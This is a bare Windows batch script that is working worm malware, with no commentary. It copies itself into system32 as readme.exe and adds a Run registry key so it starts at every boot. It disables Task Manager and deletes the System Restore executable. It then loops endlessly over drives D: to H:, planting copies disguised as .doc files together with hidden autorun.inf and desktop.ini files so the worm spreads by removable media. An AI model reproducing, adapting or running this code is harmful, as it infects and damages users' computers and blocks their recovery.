copy %0 %windir%\system32\readme.exe

reg add "hklm\software\microsoft\windows\currentversion\run" /v eomsistem /d %windir%\system32\readme.exe /f

reg add hkey_current_user\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d 1 /f

attrib %SystemRoot%\System32\restore\rstrui.exe -a -s -h

del %SystemRoot%\System32\restore\rstrui.exe /f /a /q

:gogo

copy %0 d:\Love_Girl.doc.exe
copy %0 d:\Dark_Song.doc.exe
copy %0 d:\Poopie.doc.exe
copy %0 d:\Practica-1.doc.exe
copy %MYFILES%\foto.jpg d:\
attrib d:\foto.jpg +s +h
echo [autorun]  > d:\autorun.inf
echo shellexecute=Practica-1.doc.exe>> d:\autorun.inf
attrib d:\autorun.inf +s +h

echo [ExtShellFolderViews] > d:\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> d:\desktop.ini
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> d:\desktop.ini
echo Attributes=1 >> d:\desktop.ini
echo IconArea_Image=foto.jpg >> d:\desktop.ini
echo IconArea_Text=0x00FFFFFF >> d:\desktop.ini
echo [.ShellClassInfo] >> d:\desktop.ini
echo ConfirmFileOp=0 >> d:\desktop.ini
attrib d:\desktop.ini +s +h


copy %0 e:\Love_Girl.doc.exe
copy %0 e:\Dark_Song.doc.exe
copy %0 e:\Poopie.doc.exe
copy %0 e:\Practica-1.doc.exe
copy %MYFILES%\foto.jpg e:\
attrib e:\foto.jpg +s +h
echo [autorun]  > e:\autorun.inf
echo shellexecute=Practica-1.doc.exe>> e:\autorun.inf
attrib e:\autorun.inf +s +h

echo [ExtShellFolderViews] > e:\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> e:\desktop.ini
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> e:\desktop.ini
echo Attributes=1 >> e:\desktop.ini
echo IconArea_Image=foto.jpg >> e:\desktop.ini
echo IconArea_Text=0x00FFFFFF >> e:\desktop.ini
echo [.ShellClassInfo] >> e:\desktop.ini
echo ConfirmFileOp=0 >> e:\desktop.ini
attrib e:\desktop.ini +s +h



copy %0 f:\Love_Girl.doc.exe
copy %0 f:\Dark_Song.doc.exe
copy %0 f:\Poopie.doc.exe
copy %0 f:\Practica-1.doc.exe
copy %MYFILES%\foto.jpg f:\
attrib f:\foto.jpg +s +h
echo [autorun]  > f:\autorun.inf
echo shellexecute=Practica-1.doc.exe>> f:\autorun.inf
attrib f:\autorun.inf +s +h

echo [ExtShellFolderViews] > f:\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> f:\desktop.ini
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> f:\desktop.ini
echo Attributes=1 >> f:\desktop.ini
echo IconArea_Image=foto.jpg >> f:\desktop.ini
echo IconArea_Text=0x00FFFFFF >> f:\desktop.ini
echo [.ShellClassInfo] >> f:\desktop.ini
echo ConfirmFileOp=0 >> f:\desktop.ini
attrib f:\desktop.ini +s +h



copy %0 g:\Love_Girl.doc.exe
copy %0 g:\Dark_Song.doc.exe
copy %0 g:\Poopie.doc.exe
copy %0 g:\Practica-1.doc.exe
copy %MYFILES%\foto.jpg g:\
attrib g:\foto.jpg +s +h
echo [autorun]  > g:\autorun.inf
echo shellexecute=Practica-1.doc.exe>> g:\autorun.inf
attrib g:\autorun.inf +s +h

echo [ExtShellFolderViews] > g:\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> g:\desktop.ini
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> g:\desktop.ini
echo Attributes=1 >> g:\desktop.ini
echo IconArea_Image=foto.jpg >> g:\desktop.ini
echo IconArea_Text=0x00FFFFFF >> g:\desktop.ini
echo [.ShellClassInfo] >> g:\desktop.ini
echo ConfirmFileOp=0 >> g:\desktop.ini
attrib g:\desktop.ini +s +h


copy %0 h:\Love_Girl.doc.exe
copy %0 h:\Dark_Song.doc.exe
copy %0 h:\Poopie.doc.exe
copy %0 h:\Practica-1.doc.exe
copy %MYFILES%\foto.jpg h:\
attrib h:\foto.jpg +s +h
echo [autorun]  > h:\autorun.inf
echo shellexecute=Practica-1.doc.exe>> h:\autorun.inf
attrib h:\autorun.inf +s +h

echo [ExtShellFolderViews] > h:\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> h:\desktop.ini
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> h:\desktop.ini
echo Attributes=1 >> h:\desktop.ini
echo IconArea_Image=foto.jpg >> h:\desktop.ini
echo IconArea_Text=0x00FFFFFF >> h:\desktop.ini
echo [.ShellClassInfo] >> h:\desktop.ini
echo ConfirmFileOp=0 >> h:\desktop.ini
attrib h:\desktop.ini +s +h


goto gogo
